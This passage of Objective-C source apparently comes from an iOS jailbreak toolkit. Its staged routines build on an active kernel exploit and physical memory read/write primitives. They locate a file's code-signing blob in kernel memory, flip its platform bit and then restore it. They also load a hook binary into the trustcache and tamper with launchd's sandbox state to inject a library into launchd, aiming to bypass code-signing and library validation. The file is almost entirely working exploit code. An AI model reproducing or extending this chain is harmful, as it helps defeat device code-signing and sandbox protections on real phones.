    NSString *zone8Class = @"NOT_RUN";
    NSString *identityResult = @"UNSTABLE_CHAIN";
    NSString *zone8RestoreClass = @"NOT_RUN";
    int gate = 0;

    dt696_stage("KCALL697_B4FILE_DIAG_BEGIN");
    dt696_stage("KCALL696_STAGE_D0_BEGIN");

    {
        char model[64] = {0};
        size_t mlen = sizeof(model);
        sysctlbyname("hw.machine", model, &mlen, NULL, 0);

        char osver[128] = {0};
        size_t olen = sizeof(osver);
        sysctlbyname("kern.osproductversion", osver, &olen, NULL, 0);

        uint64_t slide = gSystemInfo.kernelConstant.slide;
        dt696_emit_kv(log, "KCALL696_KERNEL_SLIDE", slide);
        dt1025_log(log, @"[*] KCALL696_TARGET_PATH=%s", dt102710_hook_path_cstr());
        dt696_stage("KCALL696_TARGET_PATH");
        dt1025_log(log, @"[*] build696 device model=%s os=%s build=%d", model, osver, DT_BUILD_NUM);
        dt696_stage(dt_kernel_exploit_is_active() ? "KCALL696_KFD_STATE=ACTIVE" : "KCALL696_KFD_STATE=INACTIVE");
        dt696_stage((gPrimitives.physreadbuf && gPrimitives.physwritebuf && gPrimitives.vtophys)
            ? "KCALL696_PHYSRW_STATE=READY" : "KCALL696_PHYSRW_STATE=NOT_READY");

        if (!dt_kernel_exploit_is_active() || !gPrimitives.physreadbuf || !gPrimitives.physwritebuf) {
            dt1025_set_verdict(verdictOut, @"KCALL696_D0_PREFLIGHT_FAIL");
            goto finish696;
        }

        if (dt696_copy_hook_to_stage(log) != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL696_D0_STAGE_FAIL");
            goto finish696;
        }
        if (access(dt102710_hook_path_cstr(), F_OK) != 0) {
            dt696_stage("KCALL696_TARGET_MISSING");
            dt1025_set_verdict(verdictOut, @"KCALL696_D0_TARGET_MISSING");
            goto finish696;
        }
        if (dt696_stage_hook_trustcache(dt102710_hook_path_cstr(), log) != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL696_D0_TRUSTCACHE_FAIL");
            goto finish696;
        }

        cdhash_t cdhash = {0};
        if (dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), cdhash) == 0) {
            dt1025_log(log, @"[*] KCALL696_TARGET_CDHASH=%@", dt_cdhash_hex_string(cdhash));
            dt696_stage("KCALL696_TARGET_CDHASH");
        }

        dt696_stage("KCALL696_STAGE_D0_PASS");
        gate = 1;
    }

    uint64_t vnode_kva = 0;
    int target_fd = -1;
    dt696_blob_chain_t chain_pre = {0};
    dt696_blob_chain_t chain_post = {0};
    dt696_blob_chain_t chain_d5 = {0};
    uint64_t blob_after_d2 = 0;
    uint64_t blob_after_d5 = 0;

    if (gate >= 1) {
        dt696_stage("KCALL696_STAGE_D1_BEGIN");
        dt696_stage("KCALL696_VNODE_LOOKUP_BEGIN");

        target_fd = open(dt102710_hook_path_cstr(), O_RDONLY | O_CLOEXEC);
        if (target_fd < 0) {
            dt1025_log(log, @"[!] build696 open target errno=%d", errno);
            dt696_stage("KCALL696_VNODE_LOOKUP_RESULT=FAIL");
            vnodeRes = @"FAIL";
            gate = 0;
        } else if (dt697_resolve_vnode_from_fd(target_fd, &vnode_kva, log) != 0) {
            dt696_stage("KCALL697_VNODE_LOOKUP_RESULT=FAIL");
            vnodeRes = @"FAIL";
            gate = 0;
        } else {
            dt696_emit_kv(log, "KCALL697_VNODE_KVA", vnode_kva);
            dt696_stage("KCALL697_VNODE_LOOKUP_RESULT=PASS");
            vnodeRes = @"PASS";
            gate = 2;
        }
    }

    if (gate >= 2) {
        dt696_stage("KCALL696_STAGE_D2_BEGIN");
        dt696_emit_kv(log, "KCALL696_B4FILE_VNODE", vnode_kva);

        int cr = dt696_read_blob_chain(vnode_kva, &chain_pre, log);
        if (cr == 0) {
            dt696_emit_kv(log, "KCALL697_UBC_INFO_KVA", chain_pre.ubc_info);
            dt696_emit_kv(log, "KCALL697_CSBLOB_KVA", chain_pre.cs_blob);
            dt1025_log(log, @"[*] KCALL697_PLATFORM_PRE_VALUE=0x%02x", chain_pre.platform);
            dt696_stage("KCALL697_PLATFORM_PRE_VALUE");
            dt696_emit_kv(log, "KCALL696_B4FILE_UBC_INFO", chain_pre.ubc_info);
            dt696_emit_kv(log, "KCALL696_B4FILE_CSBLOB", chain_pre.cs_blob);
            dt696_emit_kv(log, "KCALL696_PREFAIL_CSBLOB", chain_pre.cs_blob);
            blobRes = @"PASS";
            blob_after_d2 = chain_pre.cs_blob;
            postFailBlob = @"PRESENT";
            gate = 3;
        } else {
            dt696_stage("KCALL696_B4FILE_CSBLOB_STATE=COLD_OR_UNATTACHED");
            blobRes = @"COLD_ONLY";

            dt696_stage("KCALL696_TRIGGER_KNOWN_LV_FAIL_BEGIN");
            unsigned trig_lv = 0;
            (void)dt696_dlopen_once_count_lv(dt102710_hook_path_cstr(), &trig_lv, NULL, log);
            dt1025_log(log, @"[*] KCALL696_TRIGGER_KNOWN_LV_FAIL_RESULT=LV_HITS_%u", trig_lv);

            if (dt696_read_blob_chain(vnode_kva, &chain_post, log) == 0) {
                dt696_emit_kv(log, "KCALL696_POSTFAIL_CSBLOB", chain_post.cs_blob);
                blob_after_d2 = chain_post.cs_blob;
                blobRes = @"PASS";
                postFailBlob = @"PRESENT";
                gate = 3;
            } else {
                dt696_stage("KCALL696_POSTFAIL_CSBLOB=ABSENT");
                postFailBlob = @"ABSENT";
                gate = 0;
            }
        }
    }

    if (gate >= 3) {
        dt696_stage("KCALL696_STAGE_D3_BEGIN");

        dt696_blob_chain_t a = {0}, b = {0};
        if (dt696_read_blob_chain(vnode_kva, &a, log) != 0) {
            identityResult = @"UNSTABLE_CHAIN";
            gate = 0;
        } else {
            dt1025_log(log, @"[*] KCALL696_BLOB_IDENTITY_PRE=%@", dt696_blob_identity(&a));
            dt696_stage("KCALL696_BLOB_IDENTITY_PRE");

            unsigned d3_lv = 0;
            (void)dt696_dlopen_once_count_lv(dt102710_hook_path_cstr(), &d3_lv, NULL, log);
            (void)d3_lv;

            if (dt696_read_blob_chain(vnode_kva, &b, log) != 0) {
                identityResult = @"UNSTABLE_CHAIN";
                gate = 0;
            } else {
                dt1025_log(log, @"[*] KCALL696_BLOB_IDENTITY_POST=%@", dt696_blob_identity(&b));
                dt696_stage("KCALL696_BLOB_IDENTITY_POST");

                identityResult = dt696_classify_identity(a.cs_blob, b.cs_blob);
                dt1025_log(log, @"[*] KCALL696_BLOB_IDENTITY_RESULT=%@", identityResult);
                dt696_stage([[NSString stringWithFormat:@"KCALL696_BLOB_IDENTITY_RESULT=%@", identityResult] UTF8String]);

                if ([identityResult isEqualToString:@"UNSTABLE_CHAIN"] ||
                    [identityResult isEqualToString:@"BLOB_TO_NULL"] ||
                    ([identityResult isEqualToString:@"NEW_BLOB"] && !a.cs_blob)) {
                    gate = 0;
                } else {
                    gate = 4;
                }
            }
        }
    }

    uint8_t saved_platform = 0;
    if (gate >= 4) {
        dt696_stage("KCALL696_STAGE_D4_BEGIN");
        dt696_stage("KCALL696_ZONE8_TEST_BEGIN");

        dt696_blob_chain_t live = {0};
        if (dt696_read_blob_chain(vnode_kva, &live, log) != 0) {
            zone8Write = @"FAIL";
            zone8Class = @"BAD_POINTER";
            gate = 0;
        } else {
            uint64_t target_va = live.cs_blob + kDT696PlatformFieldOff;
            dt696_emit_kv(log, "KCALL696_ZONE8_TARGET_KVA", target_va);

            saved_platform = live.platform;
            dt1025_log(log, @"[*] KCALL696_ZONE8_PRE_VALUE=0x%02x", saved_platform);
            dt696_stage("KCALL696_ZONE8_PRE_VALUE");

            uint8_t candidate = saved_platform | 0x01U;
            dt1025_log(log, @"[*] KCALL696_ZONE8_CANDIDATE_VALUE=0x%02x", candidate);
            dt696_stage("KCALL696_ZONE8_CANDIDATE_VALUE");
            dt696_stage("KCALL696_ZONE8_WRITE_WIDTH=32RMW");

            dt696_stage("KCALL696_ZONE8_WRITE_BEGIN");
            int wr = dt_phys_write8_va_rm(target_va, candidate, "697_plat", log);
            if (wr != 0) {
                zone8Write = @"FAIL";
                zone8Class = @"WRITE_FAILED";
                gate = 0;
            } else {
                uint8_t post = 0;
                (void)dt_phys_read8_va(target_va, &post, log);
                dt1025_log(log, @"[*] KCALL696_ZONE8_POST_VALUE=0x%02x", post);
                dt696_stage("KCALL696_ZONE8_POST_VALUE");

                if (post != candidate) {
                    zone8Write = @"FAIL";
                    zone8Class = @"READBACK_MISMATCH";
                    dt696_stage("KCALL696_ZONE8_RESTORE_BEGIN");
                    (void)dt_phys_write8_va_rm(target_va, saved_platform, "697_plat_restore_mismatch", log);
                    zone8RestoreClass = @"FAIL";
                    gate = 0;
                } else {
                    zone8Write = @"PASS";
                    zone8Class = @"PASS";
                    dt696_stage("KCALL696_ZONE8_WRITE_RESULT=PASS");

                    dt696_stage("KCALL696_ZONE8_RESTORE_BEGIN");
                    int rr = dt_phys_write8_va_rm(target_va, saved_platform, "697_plat_restore", log);
                    uint8_t restored = 0;
                    (void)dt_phys_read8_va(target_va, &restored, log);
                    dt1025_log(log, @"[*] KCALL696_ZONE8_RESTORE_VALUE=0x%02x", restored);
                    dt696_stage("KCALL696_ZONE8_RESTORE_VALUE");

                    if (rr != 0 || restored != saved_platform) {
                        zone8Restore = @"FAIL";
                        zone8RestoreClass = @"FAIL";
                        zone8Class = @"RESTORE_FAILED";
                        gate = 0;
                    } else {
                        zone8Restore = @"PASS";
                        zone8RestoreClass = @"PASS";
                        dt696_stage("KCALL696_ZONE8_RESTORE_VERIFY=PASS");

                        dt696_blob_chain_t after_restore = {0};
                        if (dt696_read_blob_chain(vnode_kva, &after_restore, log) == 0 &&
                            after_restore.cs_blob == live.cs_blob) {
                            gate = 5;
                        } else {
                            zone8Class = @"POINTER_CHANGED";
                            gate = 0;
                        }
                    }
                }
            }
        }
        dt1025_log(log, @"[*] KCALL697_ZONE8_WRITE_CLASSIFICATION=%@", zone8Class);
        dt696_stage([[NSString stringWithFormat:@"KCALL697_ZONE8_WRITE_CLASSIFICATION=%@", zone8Class] UTF8String]);
        dt1025_log(log, @"[*] KCALL697_ZONE8_RESTORE_CLASSIFICATION=%@", zone8RestoreClass);
        dt696_stage([[NSString stringWithFormat:@"KCALL697_ZONE8_RESTORE_CLASSIFICATION=%@", zone8RestoreClass] UTF8String]);
    }

    if (gate >= 5) {
        dt696_stage("KCALL696_STAGE_D5_BEGIN");
        dt696_stage("KCALL696_LVCOUNT_BEGIN");

        unsigned lv_hits = 0;
        (void)dt697_dlopen_once_count_lv(dt102710_hook_path_cstr(), &lv_hits, NULL, log);

        if (lv_hits == 0) {
            lvCountStr = @"UNOBSERVABLE_WITH_CURRENT_PRIMITIVES";
            lvBlobReuse = @"UNKNOWN";
        } else {
            lvCountStr = [NSString stringWithFormat:@"BEST_EFFORT_%u", lv_hits];
            dt1025_log(log, @"[*] KCALL696_LVCOUNT_FINAL=%@", lvCountStr);
            dt696_stage([[NSString stringWithFormat:@"KCALL696_LVCOUNT_FINAL=%@", lvCountStr] UTF8String]);
        }
        dt696_stage("KCALL697_APP_LOG_LV_COUNT_IS_BEST_EFFORT_ONLY");

        if (dt696_read_blob_chain(vnode_kva, &chain_d5, log) == 0) {
            blob_after_d5 = chain_d5.cs_blob;
            if (blob_after_d2 && blob_after_d5) {
                lvBlobReuse = (blob_after_d2 == blob_after_d5) ? @"SAME" : @"DIFFERENT";
            }
        }
        dt1025_log(log, @"[*] KCALL696_LV_BLOB_REUSE=%@", lvBlobReuse);
        dt696_stage([[NSString stringWithFormat:@"KCALL696_LV_BLOB_REUSE=%@", lvBlobReuse] UTF8String]);
        gate = 6;
    }

    if (gate >= 6) {
        dt696_stage("KCALL696_STAGE_D6_BEGIN");

        uint64_t retry1 = 0;
        uint64_t retry2 = 0;

        (void)dt696_dlopen_once_count_lv(dt102710_hook_path_cstr(), NULL, NULL, log);
        dt696_blob_chain_t r1 = {0};
        if (dt696_read_blob_chain(vnode_kva, &r1, log) == 0)
            retry1 = r1.cs_blob;
        dt696_emit_kv(log, "KCALL696_RETRY1_BLOB", retry1);

        (void)dt696_dlopen_once_count_lv(dt102710_hook_path_cstr(), NULL, NULL, log);
        dt696_blob_chain_t r2 = {0};
        if (dt696_read_blob_chain(vnode_kva, &r2, log) == 0)
            retry2 = r2.cs_blob;
        dt696_emit_kv(log, "KCALL696_RETRY2_BLOB", retry2);

        if (retry1 && retry2) {
            retryBlob = (retry1 == retry2) ? @"SAME" : @"DIFFERENT";
        } else {
            retryBlob = @"UNKNOWN";
        }
        dt1025_log(log, @"[*] KCALL696_RETRY_BLOB_RESULT=%@", retryBlob);
        dt696_stage([[NSString stringWithFormat:@"KCALL696_RETRY_BLOB_RESULT=%@", retryBlob] UTF8String]);
        gate = 7;
    }

    if (gate >= 7) {
        dt696_stage("KCALL696_STAGE_D7_BEGIN");
        dt696_blob_chain_t final_chain = {0};
        if (dt696_read_blob_chain(vnode_kva, &final_chain, log) == 0) {
            dt1025_log(log, @"[*] build696 final platform=0x%02x", final_chain.platform);
            if (final_chain.platform == chain_pre.platform || final_chain.platform == chain_post.platform)
                dt696_stage("KCALL696_STAGE_D7_RESTORE_OK");
        }
        dt696_stage("KCALL696_STAGE_D7_PASS");
        finalClass = @"BUILD102697_DIAGNOSTIC_PASS";
    }

finish696:
    if (target_fd >= 0)
        close(target_fd);

    dt1025_log(log, @"[*] B4FILE_DIAG_VNODE_RESOLUTION=%@", vnodeRes);
    dt1025_log(log, @"[*] B4FILE_DIAG_BLOB_RESOLUTION=%@", blobRes);
    dt1025_log(log, @"[*] B4FILE_DIAG_POSTFAIL_BLOB=%@", postFailBlob);
    dt1025_log(log, @"[*] B4FILE_DIAG_RETRY_BLOB_IDENTITY=%@", retryBlob);
    dt1025_log(log, @"[*] B4FILE_DIAG_ZONE8_WRITE=%@", zone8Write);
    dt1025_log(log, @"[*] B4FILE_DIAG_ZONE8_RESTORE=%@", zone8Restore);
    dt1025_log(log, @"[*] B4FILE_DIAG_LV_COUNT=%@", lvCountStr);
    dt1025_log(log, @"[*] B4FILE_DIAG_MULTI_MMAP_BLOB_REUSE=%@", lvBlobReuse);

    BOOL gates_closed = (gate >= 7);
    dt1025_log(log, @"[*] B4FILE_DYNAMIC_GATES_CLOSED=%@", gates_closed ? @"YES" : @"NO");
    dt1025_log(log, @"[*] FULL_B4FILE_BYPASS_BUILD_AUTHORIZED=NO");
    dt696_stage("FULL_B4FILE_BYPASS_BUILD_AUTHORIZED=NO");

    if (verdictOut)
        *verdictOut = finalClass;

    return [finalClass isEqualToString:@"BUILD102697_DIAGNOSTIC_PASS"] ? 0 : -1;
}

int dt696_run_b4file_diagnostic(void (^log)(NSString *line), NSString **verdictOut)
{
    return dt697_run_b4file_diagnostic(log, verdictOut);
}

/* =============================================================================
 * BUILD102698 — Launchd-context Wall 1 correlation diagnostic (diagnostic only)
 * Reuses frozen dt694 Wall 2 + dt697 blob resolution + dt681 opainject/boomerang.
 * No zone-8 mutation, no B1 patch, no historical LV substring counter.
 * ============================================================================= */

static void dt698_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

static NSString *dt698_sha256_file_hex(const char *path)
{
    if (!path)
        return @"";
    NSData *data = [NSData dataWithContentsOfFile:@(path)];
    if (!data.length)
        return @"";
    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (size_t i = 0; i < CC_SHA256_DIGEST_LENGTH; i++)
        [hex appendFormat:@"%02x", digest[i]];
    return hex;
}

static void dt698_emit_blob_markers(void (^log)(NSString *line), const dt696_blob_chain_t *c,
    const char *prefix)
{
    if (!c || !c->valid)
        return;
    char buf[96];
    snprintf(buf, sizeof(buf), "%s_VNODE", prefix);
    dt696_emit_kv(log, buf, c->vnode);
    snprintf(buf, sizeof(buf), "%s_UBC_INFO", prefix);
    dt696_emit_kv(log, buf, c->ubc_info);
    snprintf(buf, sizeof(buf), "%s_CSBLOB", prefix);
    dt696_emit_kv(log, buf, c->cs_blob);
    snprintf(buf, sizeof(buf), "%s_PLATFORM_BYTE", prefix);
    dt1025_log(log, @"[*] %s_PLATFORM_BYTE=0x%02x", prefix, (unsigned)c->platform);
    dt698_stage(buf);
    snprintf(buf, sizeof(buf), "%s_PLATFORM_BIT0", prefix);
    dt1025_log(log, @"[*] %s_PLATFORM_BIT0=%u", prefix, (unsigned)(c->platform & 1u));
    dt698_stage(buf);
}

static int dt698_local_sandbox_warmup(const char *path, void (^log)(NSString *line))
{
    dt698_stage("KCALL698_BLOB_WARMUP_BEGIN");
    dlerror();
    void *h = dlopen(path, RTLD_NOW);
    const char *dle = dlerror();
    dt1025_log(log, @"[*] build698 warmup dlopen handle=%p dlerror=%s errno=%d",
        h, dle ?: "(null)", errno);
    if (h) {
        dlclose(h);
        dt698_stage("KCALL698_BLOB_WARMUP_RESULT=UNEXPECTED_SUCCESS");
        return 1;
    }
    dt698_stage("KCALL698_BLOB_WARMUP_RESULT=LOCAL_SANDBOX_WARMUP");
    return 0;
}

static BOOL dt698_launchd_alive(void)
{
    uint64_t p = proc_find(1);
    if (!p)
        return NO;
    proc_rele(p);
    return YES;
}

static NSString *dt698_classify_identity(uint64_t a, uint64_t b)
{
    if (!a && !b)
        return @"UNKNOWN";
    if (a == b)
        return @"SAME";
    return @"DIFFERENT";
}

static NSString *dt698_classify_wall1(NSString *capture, int opainject_r, int boomerang_r,
    BOOL hook_ctor_seen, BOOL boomerang_seen)
{
    if (!capture.length)
        capture = @"";
    if (boomerang_seen || hook_ctor_seen)
        return @"DEVICE_PASS";
    if ([capture containsString:@"mapping process is a platform binary, but mapped file is not"])
        return @"OLD_687_MISMATCH_REMAINS";
    if ([capture containsString:@"KCALL681_REMOTE_DLOPEN_WORKING"])
        return @"DEVICE_PASS";
    if (boomerang_r == 0)
        return @"DEVICE_PASS";
    if ([capture containsString:@"Library Validation failed"])
        return @"ADVANCED_TO_NEW_GATE";
    if (opainject_r != 0)
        return @"NOT_REACHED";
    if ([capture containsString:@"KCALL681_FILE_MAP_EXECUTABLE_BLOCKED"])
        return @"NOT_REACHED";
    return @"UNKNOWN";
}

static void dt708_stage(const char *marker)
{
    dt698_stage(marker);
}

static void dt709_stage(const char *marker)
{
    dt698_stage(marker);
}

/* BUILD102709: frozen dt694 restore truth model — 532A80 dispatch fail only;
 * X0 logged diagnostically, never interpreted as kernel status (IDA: 532A80 void). */
static int dt709_wall2_restore_launchd(uint64_t launchd_proc, const dt694_wall2_state_t *baseline,
    void (^log)(NSString *line), NSString **wall2_restore_out, BOOL *state_match_out)
{
    uint64_t restore_label = dt694_live_label(launchd_proc);
    if (!restore_label) {
        dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
        if (wall2_restore_out)
            *wall2_restore_out = @"FAIL";
        return -1;
    }

    dt709_stage("KCALL709_WALL2_RESTORE_BEGIN");
    dt709_stage("BUILD102710_WALL2_RESTORE_BEGIN");
    dt694_emit_kv(log, "KCALL709_WALL2_RESTORE_LABEL", restore_label);

    int kern = 0;
    if (dt694_kcall_532a80_label_null(restore_label, log, &kern) != 0) {
        dt709_stage("KCALL709_532A80_DISPATCH_RESULT=FAIL");
        dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
        if (wall2_restore_out)
            *wall2_restore_out = @"FAIL";
        return -2;
    }
    dt709_stage("KCALL709_532A80_DISPATCH_RESULT=PASS");
    dt709_stage("BUILD102710_532A80_RESTORE_PASS");
    dt709_stage([[NSString stringWithFormat:@"KCALL709_532A80_X0_DIAGNOSTIC=0x%x",
        (unsigned)(uint32_t)kern] UTF8String]);
    dt709_stage("KCALL709_532A80_X0_IS_STATUS=NO");
    dt694_emit_kv(log, "KCALL694_532A80_RET", (uint64_t)(uint32_t)kern);

    dt709_stage("KCALL709_FMSG_RESTORE_BEGIN");
    if (dt688a_kcall_filter_msg_set(launchd_proc, baseline->filter_message, log, &kern) != 0) {
        dt709_stage("KCALL709_FMSG_RESTORE_RESULT=FAIL");
        dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
        if (wall2_restore_out)
            *wall2_restore_out = @"FAIL";
        return -4;
    }
    dt694_emit_kv(log, "KCALL694_FMSG_RESTORE_RET", (uint64_t)(uint32_t)kern);
    dt709_stage(kern == 0 ? "KCALL709_FMSG_RESTORE_RESULT=PASS"
                          : "KCALL709_FMSG_RESTORE_RESULT=FAIL");
    if (kern == 0)
        dt709_stage("BUILD102710_FILTER_MESSAGE_RESTORE_PASS");
    if (kern != 0) {
        dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
        if (wall2_restore_out)
            *wall2_restore_out = @"FAIL";
        return -5;
    }

    dt709_stage("KCALL709_5329AC_NULL_BEGIN");
    if (dt688a_kcall_5329ac(launchd_proc, 0, log, &kern) != 0) {
        dt709_stage("KCALL709_5329AC_NULL_RESULT=FAIL");
        dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
        if (wall2_restore_out)
            *wall2_restore_out = @"FAIL";
        return -6;
    }
    dt694_emit_kv(log, "KCALL694_5329AC_RET", (uint64_t)(uint32_t)kern);
    dt709_stage(kern == 0 ? "KCALL709_5329AC_NULL_RESULT=PASS"
                          : "KCALL709_5329AC_NULL_RESULT=FAIL");
    if (kern == 0)
        dt709_stage("BUILD102710_5329AC_RESTORE_PASS");
    if (kern != 0) {
        dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
        if (wall2_restore_out)
            *wall2_restore_out = @"FAIL";
        return -7;
    }

    dt709_stage("KCALL709_RESTORED_STATE_CAPTURE_BEGIN");
    dt691_ro_zone_globals_t ro = {0};
    dt694_wall2_state_t restored = {0};
    if (dt691_load_ro_zone_globals(&ro, log) != 0
        || dt694_capture_state(launchd_proc, &ro, &restored, log) != 0) {
        dt709_stage("KCALL709_WALL2_RESTORE_FAIL");
        if (wall2_restore_out)
            *wall2_restore_out = @"FAIL";
        return -8;
    }

    BOOL slot_ok = NO, prof_ok = NO, unix_ok = NO, mach_ok = NO, mig_ok = NO, fmsg_ok = NO;
    BOOL state_match = dt694_compare_states(baseline, &restored, log,
        &slot_ok, &prof_ok, &unix_ok, &mach_ok, &mig_ok, &fmsg_ok);
    dt698_stage(state_match ? "KCALL698_WALL2_RESTORE_COMPARE=PASS"
                            : "KCALL698_WALL2_RESTORE_COMPARE=FAIL");
    dt709_stage(state_match ? "KCALL709_WALL2_RESTORE_STATE_MATCH=YES"
                            : "KCALL709_WALL2_RESTORE_STATE_MATCH=NO");
    if (state_match_out)
        *state_match_out = state_match;
    if (wall2_restore_out)
        *wall2_restore_out = state_match ? @"PASS" : @"FAIL";
    if (!state_match)
        return -9;
    dt698_stage("KCALL698_WALL2_RESTORE_RESULT=PASS");
    dt698_stage("BUILD102710_STATE_COMPARE_PASS");
    dt698_stage("BUILD102710_WALL2_RESTORE_PASS");
    return 0;
}

int dt698_run_launchd_wall1_diagnostic_ex(void (^log)(NSString *line), NSString **verdictOut,
    BOOL preserve_signed_hook)
{
    NSString *finalClass = @"BUILD102698_DIAGNOSTIC_FAIL";
    NSString *blobWarmup = @"NOT_NEEDED";
    NSString *prelaunchdBlob = @"FAIL";
    NSString *prelaunchdBit = @"UNKNOWN";
    NSString *prelaunchdIdentity = @"UNKNOWN";
    NSString *wall2Apply = @"NOT_REACHED";
    NSString *wall2Read = @"NOT_REACHED";
    NSString *wall2Exec = @"NOT_REACHED";
    NSString *opainjectAttempt = @"NOT_REACHED";
    NSString *remoteDlopen = @"NOT_REACHED";
    NSString *hookCtor = @"UNKNOWN";
    NSString *boomerangSeen = @"NOT_SEEN";
    NSString *wall1Result = @"NOT_REACHED";
    NSString *wall2Restore = @"NOT_REACHED";
    NSString *launchdAlive = @"UNKNOWN";
    NSString *postBlobIdentity = @"UNKNOWN";
    NSString *injectCapture = nil;
    BOOL wall2_restored = NO;
    BOOL wall2_restore_ok = NO;
    BOOL inject_attempted = NO;
    int inject_r = -1;
    BOOL hook_ctor_seen = NO;
    struct timespec wall2_active_enter = {0};
    int diag_rc = -1;

    dt698_stage("KCALL698_LAUNCHD_WALL1_DIAG_BEGIN");
    dt709_stage("BUILD102709_RESTORE_TRUTH_MODEL_FIX");
    dt708_stage("KCALL708_FLOW_MODE=BOUNDED_ACTIVE_WINDOW");
    dt698_stage("BUILD102698_SCOPE=LAUNCHD_CONTEXT_DIAGNOSTIC_ONLY");
    dt698_stage("HISTORICAL_LOG_SUBSTRING_LV_COUNTER_USED=NO");
    dt698_stage("INTERNAL_LV_COUNT=UNAVAILABLE");
    dt698_stage("ZONE8_MUTATION_IMPLEMENTED=NO");
    dt698_stage("B1_TEXT_PATCH_IMPLEMENTED=NO");
    dt698_stage("B4_PROC_IMPLEMENTED=NO");
    dt698_stage("BUILD102710_CANONICAL_PREBOOT_FIRST_LOAD");
    dt710_log_preboot_paths(log);
    dt710_log_var_jb_compat_state(log);
    if (!dt710_verify_path_coherence(log)) {
        dt1025_set_verdict(verdictOut, @"BUILD102710_PATH_COHERENCE_FAIL");
        return -710;
    }
    dt698_stage([[NSString stringWithFormat:@"BUILD102710_WALL2_TARGET_PATH=%@",
        dt102710_hook_path_ns()] UTF8String]);

    if (!dt_kernel_exploit_is_active()) {
        dt1025_set_verdict(verdictOut, @"KCALL698_KFD_INACTIVE");
        return -1;
    }
    if (dt_build_physrw_handoff_only(log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL698_PHYSRW_FAIL");
        return -2;
    }

    /* L1 — stage + trustcache (681 proven route; BUILD102707 preserve mode skips hook copy) */
    if (preserve_signed_hook) {
        dt698_stage("KCALL707_PHASE_B_L1_BEGIN");
        dt698_stage("KCALL707_HOOK_PRESERVE_MODE=YES");

        NSString *preL1Sha = dt698_sha256_file_hex(dt102710_hook_path_cstr());
        cdhash_t preL1Cd = {0};
        NSString *preL1CdHex = @"UNAVAILABLE";
        if (dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), preL1Cd) == 0)
            preL1CdHex = dt_cdhash_hex_string(preL1Cd);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PRE_L1_HOOK_SHA256=%@", preL1Sha ?: @""] UTF8String]);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PRE_L1_HOOK_CDHASH=%@", preL1CdHex] UTF8String]);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PHASE_A_FINAL_CDHASH=%@", preL1CdHex] UTF8String]);

        int stage_r = dt681_stage_handoff_basebin_ex(log, YES);
        dt698_stage(stage_r == 0 ? @"KCALL707_OTHER_ARTIFACT_STAGE_RESULT=OK"
                                 : @"KCALL707_OTHER_ARTIFACT_STAGE_RESULT=FAIL");
        if (stage_r != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL698_BASEBIN_STAGE_FAIL");
            return -3;
        }

        if (dt681_upload_handoff_trustcache_ex(log, YES) != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL698_TRUSTCACHE_FAIL");
            return -4;
        }

        NSString *postL1Sha = dt698_sha256_file_hex(dt102710_hook_path_cstr());
        cdhash_t postL1Cd = {0};
        NSString *postL1CdHex = @"UNAVAILABLE";
        if (dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), postL1Cd) == 0)
            postL1CdHex = dt_cdhash_hex_string(postL1Cd);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_POST_L1_HOOK_SHA256=%@", postL1Sha ?: @""] UTF8String]);
        dt698_stage([[NSString stringWithFormat:@"KCALL707_POST_L1_HOOK_CDHASH=%@", postL1CdHex] UTF8String]);

        BOOL hookPreserved = [preL1Sha isEqualToString:postL1Sha]
            && [preL1CdHex isEqualToString:postL1CdHex];
        dt698_stage(hookPreserved ? @"KCALL707_PHASE_B_HOOK_PRESERVED=YES"
                                  : @"KCALL707_PHASE_B_HOOK_PRESERVED=NO");
        if (!hookPreserved) {
            dt698_stage("KCALL707_PHASE_B_HOOK_CLOBBERED");
            dt698_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
            dt1025_set_verdict(verdictOut, @"KCALL707_PHASE_B_HOOK_CLOBBERED");
            return -81;
        }

        cdhash_t tcCd = {0};
        NSString *tcCdHex = @"UNAVAILABLE";
        if (dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), tcCd) == 0)
            tcCdHex = dt_cdhash_hex_string(tcCd);
        BOOL tcMatch = [tcCdHex isEqualToString:preL1CdHex];
        dt698_stage([[NSString stringWithFormat:@"KCALL707_PHASE_B_HOOK_TC_CDHASH=%@", tcCdHex] UTF8String]);
        dt698_stage(tcMatch ? @"KCALL707_PHASE_B_HOOK_TC_MATCH=YES" : @"KCALL707_PHASE_B_HOOK_TC_MATCH=NO");
        if (!tcMatch) {
            dt698_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
            dt1025_set_verdict(verdictOut, @"KCALL707_PHASE_B_HOOK_TC_MISMATCH");
            return -82;
        }
    } else {
        if (dt681_stage_handoff_basebin(log) != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL698_BASEBIN_STAGE_FAIL");
            return -3;
        }
        if (dt681_upload_handoff_trustcache(log) != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL698_TRUSTCACHE_FAIL");
            return -4;
        }
    }

    NSString *hookSha = dt698_sha256_file_hex(dt102710_hook_path_cstr());
    cdhash_t hookCd = {0};
    NSString *hookCdHex = @"UNAVAILABLE";
    if (dt_macho_best_cdhash_from_path(dt102710_hook_path_cstr(), hookCd) == 0)
        hookCdHex = dt_cdhash_hex_string(hookCd);
    dt1025_log(log, @"[*] CURRENT_HOOK_SHA256=%@", hookSha);
    dt1025_log(log, @"[*] CURRENT_HOOK_CDHASH=%@", hookCdHex);
